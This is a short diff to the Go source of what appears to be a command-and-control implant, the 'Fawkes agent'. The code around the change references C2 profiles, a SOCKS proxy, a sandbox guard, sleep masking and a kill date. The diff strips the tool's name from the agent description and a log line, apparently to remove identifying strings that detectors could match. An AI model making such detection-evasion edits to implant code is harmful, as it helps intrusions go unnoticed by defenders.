@@ -207,7 +207,7 @@ func runAgent() {
 		SleepInterval:     sleepIntervalInt,
 		Jitter:            jitterInt,
 		User:              getUsername(),
-		Description:       fmt.Sprintf("Fawkes agent %s", payloadUUID[:8]),
+		Description:       payloadUUID[:8],
 		KillDate:          killDateInt64,
 		WorkingHoursStart: whStartMinutes,
 		WorkingHoursEnd:   whEndMinutes,
@@ -349,7 +349,7 @@ checkinDone:
 	log.Printf("[INFO] Starting main execution loop for agent %s", agent.PayloadUUID[:8])
 	mainLoop(ctx, agent, c2, socksManager, maxRetriesInt, sandboxGuardEnabled, sleepMaskEnabled)
 	usePadding() // Reference embedded padding to prevent compiler stripping
-	log.Printf("[INFO] Fawkes agent shutdown complete")
+	log.Printf("[INFO] agent shutdown complete")
 }
 
 func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int, sandboxGuardEnabled bool, sleepMaskEnabled bool) {
